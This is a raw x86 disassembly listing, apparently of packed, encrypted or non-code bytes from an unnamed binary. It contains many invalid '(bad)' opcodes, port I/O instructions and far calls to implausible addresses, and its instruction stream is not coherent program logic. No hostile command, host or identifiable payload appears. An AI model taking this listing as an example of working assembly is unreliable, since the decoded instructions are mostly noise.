  416fc1:	jmp    0xa8ad0bab
  416fc6:	cmp    eax,0x6519b3e4
  416fcb:	in     eax,0xfd
  416fcd:	push   es
	...
  416ff6:	add    BYTE PTR [eax],al
  416ff8:	xlat   BYTE PTR ds:[ebx]
  416ff9:	pop    esp
  416ffa:	call   0xfe277ad0
  416fff:	pusha  
  417000:	mov    bh,0xf8
  417002:	cmc    
  417003:	out    dx,al
  417004:	jl     0x416fdd
  417006:	add    ebp,0x34
  417009:	in     eax,0xfd
  41700b:	cmp    DWORD PTR [edx+0x42286b91],esp
  417011:	in     al,0xb3
  417013:	fldenv [eiz*8+0x5c96c6fd]
  41701a:	call   0xfe273b10
  41701f:	pusha  
  417020:	mov    dh,0x4
  417022:	imul   BYTE PTR [esi+0x1100727c]
  417028:	xchg   ecx,eax
  417029:	ja     0x41706a
  41702b:	jmp    0x9f321f2c
  417030:	cld    
  417031:	in     al,0xfd
  417033:	adc    al,0x32
  417035:	repz jmp 0x417038
  417038:	xlat   BYTE PTR ds:[ebx]
  417039:	cdq    
  41703a:	dec    BYTE PTR [ecx-0x97fe6]
  417040:	adc    bl,cl
  417042:	test   al,dl
  417044:	or     BYTE PTR [ecx-0x570af02],bl
  41704a:	ins    BYTE PTR es:[edi],dx
  41704b:	inc    ecx
  41704c:	addr16 cdq 
  41704e:	mov    ah,0xf0
  417050:	or     BYTE PTR [ecx+0x508afffe],bl
  417056:	call   0xfedac828
  41705b:	mov    DWORD PTR [eax],eax
	...
  417085:	add    dl,bl
  417087:	mov    esi,esi
  417089:	call   DWORD PTR [eax]
  41708b:	mov    dh,0xfd
  41708d:	addr16 jge 0x41703b
  417090:	inc    eax
  417091:	add    BYTE PTR [eax+0x63],ah
  417094:	in     eax,dx
  417095:	not    DWORD PTR [eax-0x67]
  417098:	(bad)  
  417099:	jne    0x4170ba
  41709b:	xor    BYTE PTR [edi-0x7766cfd0],ch
  4170a1:	test   DWORD PTR [ebx+0x21],edx
  4170a4:	(bad)  
  4170a5:	jmp    DWORD PTR [edx+0x10f7c1d3]
  4170ab:	call   0x40:0xab8a684d
  4170b2:	loopne 0x41711f
  4170b4:	in     eax,dx
  4170b5:	not    DWORD PTR [eax]
  4170b7:	call   0x308f:0x2fdf75fe
  4170be:	lock cdq 
  4170c0:	mov    BYTE PTR [ebp-0x1de71],al
  4170c6:	ins    DWORD PTR es:[edi],dx
  4170c7:	pop    edi
  4170c8:	push   0xfe18827e
  4170cd:	dec    BYTE PTR [edx+0x2f]
  4170d0:	idiv   bh
  4170d2:	loopne 0x41706d
  4170d4:	je     0x4170de
  4170d6:	iret   
  4170d7:	mov    eax,ds:0xcd3eff2d
  4170dc:	mov    DWORD PTR [esi+edi*2-0x3401c034],eax
  4170e3:	jbe    0x417161
  4170e5:	not    BYTE PTR [ecx+0x67d464]
	...
  417113:	add    BYTE PTR [esi+ebx*2+0x2e80ffc1],dh
  41711a:	xor    al,0xf6
  41711c:	jns    0x41719a
  41711e:	aas    
  41711f:	je     0x417167
  417121:	mov    dl,bh
  417123:	das    
  417124:	imul   ecx,DWORD PTR [ecx+ecx*4+0x3f8ca284],0x30debdfe
  41712f:	not    BYTE PTR [ecx+0x24]
  417132:	add    al,0xf
  417134:	ret    0x434
  417137:	add    BYTE PTR [esi],bh
  417139:	jno    0x4171b8
  41713b:	iret   
  41713c:	xor    DWORD PTR [edx],edi
  41713e:	aas    
  41713f:	jmp    FWORD PTR [edx-0x19437b11]
  417145:	inc    ecx
  417146:	aas    
  417147:	(bad)  
  417148:	add    DWORD PTR ds:[esi+0x1f43eb0],eax
  41714f:	push   0xbd30f43e
  417154:	or     DWORD PTR [eax+0x11],esp
  417157:	call   0xfe828d20
  41715c:	stc    
  41715d:	mov    edi,0x1f1f62d
  417162:	inc    ecx
  417163:	je     0x4171b3
  417165:	sbb    al,0x10
  417167:	sub    ah,cl
  417169:	adc    DWORD PTR [ecx-0x4c],eax
  41716c:	out    0xa1,al
  41716e:	inc    eax
  41716f:	(bad)  
  417170:	shl    DWORD PTR [edi],1
  417172:	adc    al,0xe8
  417174:	ds pop esi
  417176:	aas    
  417177:	inc    BYTE PTR [eax]
	...
  4171a1:	add    cl,al
  4171a3:	addr16 and eax,0xa65bb9f6
  4171a9:	inc    eax
  4171aa:	sub    cl,BYTE PTR [ebx-0x71]
  4171ad:	xor    eax,0x4096e256
  4171b2:	jmp    0x3ce2:0x984096ff
  4171b9:	and    ecx,DWORD PTR [eax+0x12407ee2]
  4171bf:	dec    ebx
  4171c0:	jg     0x417237
  4171c2:	push   esi
  4171c3:	loop   0x417233
  4171c5:	inc    eax
  4171c6:	mov    dl,0x3
  4171c8:	pop    edi
  4171c9:	inc    eax
  4171ca:	jo     0x4171ae
  4171cc:	aam    0x13
  4171ce:	push   esi
  4171cf:	or     eax,DWORD PTR [ecx]
  4171d1:	inc    ecx
  4171d2:	pusha  
  4171d3:	loop   0x417169
  4171d5:	push   ebx
  4171d6:	push   eax
  4171d7:	loop   0x41721f
  4171d9:	inc    eax
  4171da:	mov    al,BYTE PTR [edi]
  4171dc:	aaa    
  4171dd:	inc    eax
  4171de:	dec    eax
  4171df:	loop   0x41719d
  4171e1:	adc    edx,DWORD PTR [esi-0x35]
  4171e4:	add    BYTE PTR [ecx+0x38],al
  4171e7:	loop   0x417245
  4171e9:	dec    edi
  4171ea:	sub    dl,ah
  4171ec:	push   ds
  4171ed:	inc    eax
  4171ee:	mov    dl,0x4b
  4171f0:	push   DWORD PTR [eax+0x56]
  4171f3:	loop   0x417203
  4171f5:	inc    eax
  4171f6:	rcl    BYTE PTR [esi],cl
  4171f8:	(bad)  
  4171f9:	aas    
  4171fa:	adc    dl,ah
  4171fc:	xor    al,0x4b
  4171fe:	adc    dl,ah
  417200:	idiv   BYTE PTR [edi]
  417202:	mov    cl,BYTE PTR [ebx-0x1]
  417205:	mov    al,0x0
	...
  41722f:	add    BYTE PTR [esi],ah
  417231:	loop   0x417219
  417233:	aas    
  417234:	stos   BYTE PTR es:[edi],al
  417235:	sbb    dl,bh
  417237:	aas    
  417238:	call   0xd655cf1e
  41723d:	into   
  41723e:	add    BYTE PTR [edi],bh
  417240:	fsub   st,st(1)
  417242:	jl     0x4172c0
  417244:	enter  0xbee1,0x3f
  417248:	xchg   edx,eax
  417249:	sahf   
  41724a:	add    BYTE PTR [esi+0x34fde101],bh
  417250:	push   edx
  417251:	repz dec esp
  417253:	shl    BYTE PTR [eax-0x1f],1
  417256:	std    
  417257:	adc    al,0x52
  417259:	loop   0x41720e
  41725b:	cdq    
  41725c:	imul   esp,ecx,0x59d78efd
  417262:	call   0xfe2271d2
  417267:	jle    0x417270
  417269:	repnz cmc 
  41726b:	jbe    0x4172ae
  41726d:	cli    
  41726e:	inc    edi
  41726f:	mov    ebp,0x9cfde138
  417274:	cs jmp 0x205bd177
  41727a:	sub    al,0x56
  41727c:	and    ecx,esp
  41727e:	mov    bl,0x41
  417280:	adc    ecx,esp
  417282:	std    
  417283:	push   ecx
  417284:	dec    ebp
  417285:	xor    eax,0xa7093efd
  41728a:	in     al,0x3e
  41728c:	add    ecx,esp
  41728e:	call   0xfe23a094
  417293:	add    BYTE PTR es:[eax],al
	...
  4172be:	mov    bh,0x0
  4172c0:	neg    BYTE PTR [esi]
  4172c2:	imul   edi,eax,0xe160c51b
  4172c8:	std    
  4172c9:	push   esp
  4172ca:	jp     0x4172b5
  4172cc:	std    
  4172cd:	push   es
  4172ce:	bound  ecx,QWORD PTR [edx+0x2c]
  4172d1:	dec    BYTE PTR [eax-0x1f]
  4172d4:	mov    bl,0x1d
  4172d6:	dec    ecx
  4172d7:	loope  0x4172d6
  4172d9:	add    DWORD PTR [ecx+0x2f],eax
  4172dc:	std    
  4172dd:	out    0x30,al
  4172df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172e0:	int3   
  4172e1:	(bad)  
  4172e2:	sub    cl,ah
  4172e4:	call   0xfe2347be
  4172e9:	into   
  4172ea:	push   esi
  4172eb:	sbb    dh,dh
  4172ed:	add    al,bh
  4172ef:	and    ebp,esp
  4172f1:	icebp  
  4172f2:	sub    al,0x20
  4172f4:	(bad)  
  4172f5:	inc    DWORD PTR [edx-0x64]
  4172f8:	idiv   bh
  4172fa:	call   0xd86d5633
  4172ff:	and    esi,edi
  417301:	mov    ch,0xb
  417303:	sub    esi,edi
  417305:	(bad)  
  417306:	mov    edi,0xc8ff2a85
  41730b:	and    DWORD PTR [eax+edi*8-0x52],eax
  41730f:	hlt    
  417310:	cld    
  417311:	dec    DWORD PTR [eax]
  417313:	and    DWORD PTR [esp+edi*8-0x41],esi
  417317:	sub    DWORD PTR [esi],edx
  417319:	add    BYTE PTR [edi-0x71],ah
  41731c:	mov    edi,0x8b03670c
  417321:	in     al,dx
	...
  41734a:	add    BYTE PTR [eax],al
  41734c:	aam    0x97
  41734e:	stc    
  41734f:	push   0x57
  417351:	mov    dl,0x59
  417353:	push   DWORD PTR [edx+0x54]
  417356:	call   0xfe61a348
  41735b:	mov    DWORD PTR [edx+0x5f75fe20],esp
  417361:	mov    ah,0x11
  417363:	ins    DWORD PTR es:[edi],dx
  417364:	out    0x5b,al
  417366:	std    
  417367:	xor    eax,0x411489
  41736c:	dec    edi
  41736d:	mov    edi,ecx
  41736f:	dec    DWORD PTR [eax+0x21]
  417372:	je     0x41737c
  417374:	mov    edi,0x27416b47
  417379:	mov    ah,0xff
  41737b:	call   DWORD PTR [edi]
  41737d:	fsubr  st(5),st
  41737f:	mov    ebx,0xfffe1e0b
  417384:	jb     0x4173a6
  417386:	(bad)  
  417387:	jne    0x417378
  417389:	xor    edi,ebp
  41738b:	sub    BYTE PTR [eax],cl
  41738d:	push   ds
  41738e:	enter  0x3ec2,0xee
  417392:	add    DWORD PTR [ebp-0x3b],edx
  417395:	popf   
  417396:	jg     0x41735b
  417398:	ror    BYTE PTR [ecx+0x5fd90004],cl
  41739e:	lods   al,BYTE PTR ds:[esi]
  41739f:	xchg   esi,eax
  4173a0:	push   ebx
  4173a1:	xor    eax,DWORD PTR [edi+edi*8]
  4173a4:	xor    edi,esi
  4173a6:	cmp    al,0x74
  4173a8:	inc    esi
  4173a9:	retf   0x53d5
  4173ac:	test   eax,0xacc0
	...
  4173d9:	add    BYTE PTR [esi],bh
  4173db:	fnstcw WORD PTR [esi+0x67]
  4173de:	fstp   st(6)
  4173e0:	ret    0x90ff
  4173e3:	fimul  WORD PTR ds:0x29ea13ff
  4173e9:	aas    
  4173ea:	jmp    0x29fd:0xf3fe3b68
  4173f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173f2:	cs jns 0x417430
  4173f5:	or     bh,BYTE PTR [esi+0x5]
  4173f8:	test   DWORD PTR [eax-0x537a05],0x677e2059
  417402:	test   eax,0x48ffc306
  417407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417408:	cmp    eax,0x29f9cbfe
  41740d:	sbb    edx,DWORD PTR [edx+0x3f673b2d]
  417413:	hlt    
  417414:	sub    al,0xbd
  417416:	xchg   esi,eax
  417417:	xchg   ecx,eax
  417418:	lods   eax,DWORD PTR ds:[esi]
  417419:	inc    eax
  41741a:	ds inc ebp
  41741c:	mov    ch,0xfb
  41741e:	sbb    eax,ecx
  417420:	or     eax,ebp
  417422:	cmp    eax,eax
  417424:	cmp    al,0xfe
  417426:	or     DWORD PTR [eax+0x3d],ebp
  417429:	out    0x33,eax
  41742b:	sbb    DWORD PTR ds:0xc3307fe,edi
  417431:	add    BYTE PTR [ebx-0x43d08da5],cl
  417437:	pop    ss
  417438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417439:	test   eax,0xaed176e1
	...
  417466:	add    BYTE PTR [eax],al
  417468:	jle    0x4174c5
  41746a:	aas    
  41746b:	inc    edx
  41746c:	bound  ebx,QWORD PTR [edi+eiz*8-0x30b0adc4]
  417473:	add    al,0x10
  417475:	fidiv  WORD PTR [esi-0x2a9881f8]
  41747b:	mov    bh,dl
  41747d:	fisub  WORD PTR [esi+0x14dea5b6]
  417483:	or     al,0x96
  417485:	jle    0x41741d
  417487:	cmp    al,0x98
  417489:	ficom  WORD PTR [eax+eax*2]
  41748c:	cdq    
  41748d:	or     dl,dl
  41748f:	cmp    al,0x88
  417491:	jno    0x41747a
  417493:	stos   DWORD PTR es:[edi],eax
  417494:	xor    eax,0xe604286d
  417499:	sbb    ch,bh
  41749b:	ret    0xdd71
  41749e:	fmul   QWORD PTR [edi]
  4174a0:	push   esi
  4174a1:	add    al,0xd
  4174a3:	cmp    eax,0xb7275260
  4174a8:	xor    edx,esp
  4174aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174ab:	aas    
  4174ac:	push   eax
  4174ad:	push   0x52d23c43
  4174b2:	dec    edi
  4174b3:	repnz inc eax
  4174b5:	fidiv  WORD PTR [esi]
  4174b7:	cmp    al,0xb2
  4174b9:	fistp  QWORD PTR [edi]
  4174bb:	fisub  WORD PTR fs:0x29a9
  4174c1:	jbe    0x4174bf
  4174c3:	lods   eax,DWORD PTR ds:[esi]
  4174c4:	jle    0x417521
  4174c6:	jg     0x417523
  4174c8:	stos   BYTE PTR es:[edi],al
  4174c9:	pushf  
  4174ca:	out    0x3c,eax
	...
  4174f4:	add    BYTE PTR [eax],al
  4174f6:	mov    cl,BYTE PTR [edi+0xf]
  4174f9:	push   0x7fede5a
  4174fe:	(bad)  
  4174ff:	data16 add bh,bl
  417502:	les    edx,FWORD PTR [esi-0x1e541104]
  417508:	std    
  417509:	pop    esp
  41750a:	cmp    dh,bl
  41750c:	add    esi,ebx
  41750e:	and    eax,0x165cfddd
  417513:	div    BYTE PTR [edi+0x3]
  417516:	adc    eax,0xe2c8bdd
  41751b:	mov    gs,WORD PTR [eax-0x2a]
  41751e:	xchg   edi,eax
  41751f:	call   0xe93f:0x6f1a4100
  417526:	je     0x41758f
  417528:	or     al,0x91
  41752a:	jmp    0x31e0725d
  41752f:	sbb    esi,DWORD PTR [ebp+0x10]
  417532:	retf   
  417533:	xchg   esi,eax
  417534:	clc    
  417535:	push   0xffffffd7
  417537:	jmp    0xd1177140
  41753c:	inc    ebx
  41753d:	xor    DWORD PTR [ecx+0x5cd93cdd],0x3ef7fddd
  417547:	mov    ds:0x5b420e10,eax
  41754c:	xchg   DWORD PTR [ebp+ebp*1-0x70a9b30f],esp
  417553:	in     eax,dx
  417554:	push   0x9aa404
  417559:	je     0x41755b
	...
  417583:	add    BYTE PTR [edi+0x15],bh
  417586:	push   ecx
  417587:	push   ecx
  417588:	jae    0x4175d1
  41758a:	add    cl,ch
  41758c:	rcr    BYTE PTR [eax],0xd
  41758f:	pop    esp
  417590:	call   FWORD PTR [eax]
  417592:	push   ecx
  417593:	je     0x417594
  417595:	adc    al,0x51
  417597:	xchg   ecx,eax
  417598:	test   DWORD PTR [edi+0x3f],ebp
  41759b:	jmp    0x14ddcf4
  4175a0:	and    eax,0x4000fd30
  4175a5:	dec    esp
  4175a6:	shl    BYTE PTR [ebx+eiz*8-0x31],0x44
  4175ab:	cld    
  4175ac:	mov    fs:0x4d6903c1,al
  4175b2:	std    
  4175b3:	jne    0x417598
  4175b5:	and    DWORD PTR [eax+ecx*1+0xf],esi
  4175b9:	fdivr  st,st(3)
  4175bb:	push   eax
  4175bd:	and    DWORD PTR [esp+edi*8-0x1],esi
  4175c1:	sub    DWORD PTR [eax],ebp
  4175c3:	inc    DWORD PTR [eax]
  4175c5:	and    cl,BYTE PTR [eax+esi*8+0x54]
  4175c9:	mov    ds:0x717a00ed,eax
  4175ce:	(bad)  
  4175cf:	jne    0x4175c0
  4175d1:	xor    bl,ah
  4175d3:	sub    eax,esp
  4175d5:	and    eax,ecx
  4175d7:	ret    0x58af
  4175da:	push   ebx
  4175db:	mov    eax,ebx
  4175dd:	aad    0xc1
  4175df:	cld    
  4175e0:	cmp    eax,0xc05d6a57
  4175e5:	stos   DWORD PTR es:[edi],eax
  4175e6:	add    eax,0xe8
	...
  41760f:	add    BYTE PTR [eax],al
  417611:	add    BYTE PTR [edi-0x21000107],cl
  417617:	sbb    bh,dl
  417619:	push   0xbeed5867
  41761e:	(bad)
  417622:	push   edi
  417623:	mov    al,0xae
  417625:	ins    DWORD PTR es:[edi],dx
  417626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417627:	pop    eax
  417628:	std    
  417629:	jne    0x41768a
  41762b:	xor    dl,dh
  41762d:	push   edx
  41762e:	add    BYTE PTR [ecx],ah
  417630:	add    DWORD PTR gs:[edi+0x31],edx
  417634:	mov    ebx,0x40b2c468
  417639:	add    bh,bh
  41763b:	jo     0x4176a9
  41763d:	inc    ecx
  41763e:	pop    ss
  41763f:	and    DWORD PTR [eax+ecx*1+0x4f],esi
  417643:	test   BYTE PTR [edi-0x1],cl
  417646:	ds inc ebp
  417648:	test   eax,0x78dd11ff
  41764d:	addr16 mov cl,0xc6
  417650:	(bad)  
  417651:	call   FWORD PTR [ecx+0x3e40a89a]
  417657:	in     eax,0xad
  417659:	pop    es
  41765a:	out    0x36,al
  41765c:	sar    esi,cl
  41765e:	jmp    0xd14177ec
  417663:	mov    ebx,0x336ba2ac
  417668:	add    al,0x68
  41766a:	xchg   esi,eax
  41766b:	push   ds
  41766c:	sar    edi,0xc8
  41766f:	push   ds
  417670:	or     al,0xe8
  417672:	nop
  417673:	aas    
  417674:	aaa    
  417675:	inc    BYTE PTR [eax]
	...
  41769f:	add    BYTE PTR [ecx-0xb89822],bh
  4176a5:	icebp  
  4176a6:	cmp    BYTE PTR [esi+esi*1-0x36],dh
  4176aa:	fdivp  st(5),st
  4176ac:	mov    eax,ds:0x3e01acbc
  4176b1:	repnz cmp esi,0x4c29fa0b
  4176b8:	mov    ah,dl
  4176ba:	aaa    
  4176bb:	dec    BYTE PTR [ebx]
  4176bd:	pop    esi
  4176be:	aaa    
  4176bf:	je     0x417707
  4176c1:	fimul  DWORD PTR [ecx+0x25]
  4176c4:	jno    0x417732
  4176c6:	dec    ecx
  4176c7:	rol    DWORD PTR [edx-0xe],0xce
  4176cb:	mov    dl,BYTE PTR [edx+0x70]
  4176ce:	inc    eax
  4176cf:	sti    
  4176d0:	pop    ecx
  4176d1:	dec    BYTE PTR ds:0x29e1cbff
  4176d7:	xchg   edi,eax
  4176d8:	pop    es
  4176d9:	xchg   ebp,eax
  4176da:	aaa    
  4176db:	or     bh,BYTE PTR [esi-0x5b]
  4176de:	repnz mov BYTE PTR [ebx+0x56743790],al
  4176e5:	mov    DWORD PTR [ebp+0x3c5c1607],ebp
  4176eb:	fbld   TBYTE PTR [eax]
  4176ed:	fistp  DWORD PTR [esi]
  4176ef:	scas   eax,DWORD PTR es:[edi]
  4176f0:	inc    ebp
  4176f1:	ficomp DWORD PTR [ebx+ecx*1+0x38c58826]
  4176f8:	or     bl,bl
  4176fa:	jl     0x417733
  4176fc:	add    BYTE PTR [ecx-0x11],dl
  4176ff:	sub    ebx,DWORD PTR [esi]
  417701:	xor    esi,0x38
	...
  41772b:	add    BYTE PTR [eax],al
  41772d:	add    al,dh
  41772f:	push   eax
  417730:	jmp    0x41775d
  417732:	inc    ebx
  417733:	test   dh,ah
  417735:	cmp    BYTE PTR [ecx+0x3e03e75c],ch
  41773b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41773c:	test   eax,0x62303e0f
  417741:	daa    
  417742:	mov    esp,0x6bd0bf9f
  417747:	adc    bl,BYTE PTR cs:[ebp-0x8]
  41774b:	mov    BYTE PTR [ebp-0x3d],al
  41774e:	mov    cl,0xe7
  417750:	and    al,0x38
  417752:	stc    
  417753:	xor    DWORD PTR [esi+0x14da31ae],esp
  417759:	or     BYTE PTR [esi-0x6fc73d30],ah
  41775f:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  417761:	scas   eax,DWORD PTR es:[edi]
  417762:	daa    
  417763:	sub    ecx,DWORD PTR [edi]
  417765:	add    al,0x3e
  417767:	retf   0x383d
  41776a:	repnz (bad) 
  41776c:	pop    ss
  41776d:	shl    DWORD PTR [eax+0x50],1
  417770:	fild   QWORD PTR [ebx]
  417772:	call   0x3479de50
  417777:	mov    bl,0x4f
  417779:	js     0x41779c
  41777b:	ficom  DWORD PTR [esi+0x37]
  41777e:	or     al,0x9b
  417780:	nop
  417781:	cmp    BYTE PTR [eax-0x26],cl
  417784:	inc    esi
  417785:	xor    eax,0xaee69393
  41778a:	std    
  41778b:	sbb    DWORD PTR [ecx],eax
  41778d:	test   eax,0x5c001ae6
	...
  4177ba:	add    BYTE PTR [eax],al
  4177bc:	call   0x66ffc896
  4177c1:	dec    edi
  4177c2:	adc    BYTE PTR [esi],bl
  4177c4:	call   0x229f602e
  4177c9:	fscale 
  4177cb:	loop   0x41784a
  4177cd:	dec    esi
  4177ce:	xor    BYTE PTR [ecx-0x6e07e14c],bl
  4177d4:	inc    edx
  4177d5:	pop    ebx
  4177d6:	in     eax,dx
  4177d7:	aaa    
  4177d8:	ss dec edi
  4177da:	or     BYTE PTR [ecx],al
  4177dc:	in     eax,0x7e
  4177de:	std    
  4177df:	out    0xf1,al
  4177e1:	fdiv   DWORD PTR [ebx-0xf]
  4177e4:	and    eax,0x9d623eb
  4177e9:	fnstenv [ebx-0x33]
  4177ec:	adc    DWORD PTR [edi-0x8],ecx
  4177ef:	(bad)  
  4177f0:	(bad)  
  4177f1:	popa   
  4177f2:	call   0xfe1a170d
  4177f7:	shl    ebp,0x81
  4177fa:	std    
  4177fb:	scas   al,BYTE PTR es:[edi]
  4177fc:	mov    ebp,0xada4ffa4
  417801:	sbb    DWORD PTR [eax-0x226ae62],edi
  417807:	fwait
  417808:	sbb    BYTE PTR [edx+0x19201405],dl
  41780e:	xchg   ecx,eax
  41780f:	push   ss
  417810:	jnp    0x4177eb
  417812:	mov    WORD PTR [esi+esi*1],fs
  417815:	sub    dl,BYTE PTR [ebp+0x76]
  417818:	scas   eax,DWORD PTR es:[edi]
  417819:	imul   edi,ebp,0x5bc341f4
  41781f:	adc    al,BYTE PTR [eax]
	...
  417849:	add    BYTE PTR [ecx],ch
  41784b:	(bad)  [ecx]
  41784d:	sub    DWORD PTR [esi+0xa625033],ecx
  417853:	fnstsw WORD PTR [ebx+0x4d]
  417856:	inc    ebx
  417857:	push   ecx
  417858:	dec    esp
  417859:	add    bh,dl
  41785b:	rol    BYTE PTR [eax],1
  41785d:	jne    0x41787c
  41785f:	pop    ss
  417860:	dec    DWORD PTR [ebp+0x6b]
  417863:	pop    es
  417864:	add    DWORD PTR [eax],eax
  417866:	push   0x5b75fe51
  41786b:	test   eax,0x64b2ff56
  417870:	call   0xfed1a24b
  417875:	or     ecx,DWORD PTR [edi-0x7c]
  417878:	sub    al,0x80
  41787a:	stc    
  41787b:	pop    edx
  41787c:	jae    0x4178a6
  41787e:	mov    eax,ds:0xbdfc4c91
  417883:	pop    esp
  417884:	mov    eax,DWORD PTR [ebp-0x25]
  417887:	lods   al,BYTE PTR ds:[esi]
  417888:	push   ebx
  417889:	call   0x4027e4
  41788e:	int3   
  41788f:	sbb    al,0x71
  417891:	adc    al,0x7f
  417893:	pop    ebp
  417894:	add    bh,ch
  417896:	mov    ecx,0x21fc7491
  41789b:	test   al,0xfe
  41789d:	jne    0x41784e
  41789f:	test   BYTE PTR [esi+0xa91e8fe],ah
  4178a5:	fdivr  DWORD PTR [edi+0x79]
  4178a8:	es (bad) 
  4178aa:	fcom   DWORD PTR [eax+0xc032]
	...
  4178d8:	push   ds
  4178d9:	xchg   ecx,eax
  4178da:	(bad)  
  4178db:	jmp    FWORD PTR [eax-0x5fc75476]
  4178e1:	or     eax,DWORD PTR [edx+0x410176bf]
  4178e7:	add    dl,ch
  4178e9:	call   0x1074:0x905050f9
  4178f0:	fmul   DWORD PTR [edx]
  4178f2:	or     ch,al
  4178f4:	sti    
  4178f5:	sar    esi,0xff
  4178f8:	dec    esp
  4178f9:	sbb    al,0x71
  4178fb:	xor    BYTE PTR [esi],bh
  4178fd:	adc    cl,BYTE PTR [ebp-0x265b9bc]
  417903:	call   DWORD PTR [eax-0x20]
  417906:	ss je  0x41794f
  417909:	sub    ah,BYTE PTR [ecx-0x316ecedd]
  41790f:	(bad)  
  417910:	mov    bl,0xba
  417912:	sub    DWORD PTR [eax-0x1c97ea6],edi
  417918:	xchg   ebx,eax
  417919:	jbe    0x417951
  41791b:	je     0x417933
  41791d:	jno    0x4178cf
  41791f:	pop    es
  417920:	push   ss
  417921:	jmp    0x6a437803
  417926:	xchg   edx,eax
  417927:	es stc 
  417929:	fdivr  DWORD PTR [edi-0x36]
  41792c:	aas    
  41792d:	into   
  41792e:	out    dx,eax
  41792f:	mov    edi,0xfe33c8a7
  417934:	loope  0x4178e9
  417936:	data16 aaa 
  417938:	inc    ecx
  417939:	das    
  41793a:	data16 or al,BYTE PTR [eax]
	...
  417965:	add    ch,dh
  417967:	xor    eax,0xc22e6805
  41796c:	and    al,0xbd
  41796e:	rcl    DWORD PTR [esi+0x5e5ce80c],0x33
  417975:	inc    ch
  417977:	add    al,0xd8
  417979:	pop    ebp
  41797a:	or     ebx,edi
  41797c:	inc    edx
  41797d:	(bad)  
  41797f:	xchg   edi,eax
  417980:	xchg   ebx,ebp
  417982:	mov    edi,0x91f634fd
  417987:	lock test DWORD PTR [edx+ecx*4-0x6f],eax
  41798c:	xor    esi,DWORD PTR [esi+ebp*1-0x1f]
  417990:	lods   eax,DWORD PTR ds:[esi]
  417991:	or     esp,DWORD PTR [esi+0x43]
  417994:	(bad)  
  417996:	ds mov ebp,0xe97441
  41799c:	mov    esi,0xe75b3ef7
  4179a1:	add    edi,DWORD PTR [esi]
  4179a3:	mov    al,ds:0x5f502fa4
  4179a8:	out    0x3,eax
  4179aa:	aam    0x5a
  4179ac:	rol    DWORD PTR [ebx],0xd4
  4179af:	pop    edx
  4179b0:	rol    DWORD PTR [ebx],1
  4179b2:	retf   
  4179b3:	and    BYTE PTR [ebx],dh
  4179b5:	aam    0xc2
  4179b7:	loopne 0x4179f4
  4179b9:	sub    eax,0x3497d728
  4179be:	stos   BYTE PTR es:[edi],al
  4179bf:	shl    DWORD PTR [esi],cl
  4179c1:	scas   eax,DWORD PTR es:[edi]
  4179c2:	adc    eax,0x3e10bfc4
  4179c7:	pop    ebx
  4179c8:	loop   0x417a0d
	...
  4179f2:	add    BYTE PTR [eax],al
  4179f4:	lea    ebx,[ecx+0x2]
  4179f7:	mov    edi,0xc2afe199
  4179fc:	stc    
  4179fd:	aad    0x74
  4179ff:	adc    esp,esi
  417a01:	pop    es
  417a02:	ret    0xe834
  417a05:	loop   0x417a1e
  417a07:	xchg   DWORD PTR [edx-0x27cb2131],edi
  417a0d:	sub    edi,DWORD PTR [ecx]
  417a0f:	sub    al,0xce
  417a11:	adc    esi,0xd7e0b634
  417a17:	sub    al,0xc0
  417a19:	(bad)  
  417a1a:	push   ecx
  417a1b:	add    al,0xb9
  417a1d:	adc    BYTE PTR [eax-0x49294fd4],bh
  417a23:	scas   al,BYTE PTR es:[edi]
  417a24:	xor    eax,0x960c34d6
  417a29:	ret    
  417a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a2b:	xor    al,0x98
  417a2d:	(bad)  
  417a2e:	push   esp
  417a2f:	xor    ecx,DWORD PTR [eax+0x672b96d6]
  417a35:	jge    0x4179c5
  417a37:	xor    al,0x80
  417a39:	and    BYTE PTR [edi+0x28],bh
  417a3c:	leave  
  417a3d:	(bad)  
  417a3e:	hlt    
  417a3f:	aaa    
  417a40:	pop    ecx
  417a41:	aam    0x0
  417a43:	fstp   TBYTE PTR ds:0x39abc75b
  417a49:	pop    ebx
  417a4a:	push   ebx
  417a4b:	jb     0x417a6e
  417a4d:	fcmovnb st,st(4)
  417a4f:	pop    ecx
  417a50:	and    dl,ch
  417a52:	std    
  417a53:	fs mov dl,dl
  417a56:	push   eax
  417a57:	dec    esi
	...
  417a80:	add    BYTE PTR [eax],al
  417a82:	nop
  417a83:	data16 std 
  417a85:	mov    esp,0xdbe1c341
  417a8a:	cmp    eax,0x4229095b
  417a8f:	loopne 0x417a17
  417a91:	jmp    0xad06d5d3
  417a96:	push   ebp
  417a97:	(bad)  
  417a98:	std    
  417a99:	jmp    0x1d8518db
  417a9e:	push   edx
  417a9f:	pop    ebp
  417aa0:	add    cl,ch
  417aa2:	xlat   BYTE PTR ds:[ebx]
  417aa3:	aad    0x67
  417aa5:	jmp    0xe9a95051
  417aaa:	mov    eax,0xc099f41e
  417aaf:	fdivrp st(4),st
  417ab1:	imul   BYTE PTR ds:0x97e650d5
  417ab7:	int    0xfd
  417ab9:	push   esp
  417aba:	push   cs
  417abb:	mov    esi,0x5b3dfbb3
  417ac0:	or     DWORD PTR [ecx+0x35e95b86],ebp
  417ac6:	(bad)  
  417ac8:	dec    eax
  417ac9:	sub    BYTE PTR [edx],bh
  417acb:	(bad)  
  417acc:	jae    0x417aa7
  417ace:	inc    ebp
  417acf:	arpl   WORD PTR [edx],bp
  417ad1:	scas   al,BYTE PTR es:[edi]
  417ad2:	ins    DWORD PTR es:[edi],dx
  417ad3:	loope  0x417aa5
  417ad5:	je     0x417a9e
  417ad7:	leave  
  417ad8:	cmc    
  417ad9:	sahf   
  417ada:	dec    ebp
  417adb:	es push edx
  417add:	cmp    DWORD PTR [ebx+eax*4-0x3],0x144f4d8e
	...
  417b0d:	add    BYTE PTR [eax],al
  417b0f:	add    BYTE PTR [edi+0x77],dl
  417b12:	inc    esp
  417b13:	sub    dh,al
  417b15:	mov    DWORD PTR [eax-0x16e187b],ecx
  417b1b:	call   eax
  417b1d:	push   ebx
  417b1e:	in     eax,dx
  417b1f:	mul    eax
  417b21:	mov    esi,edi
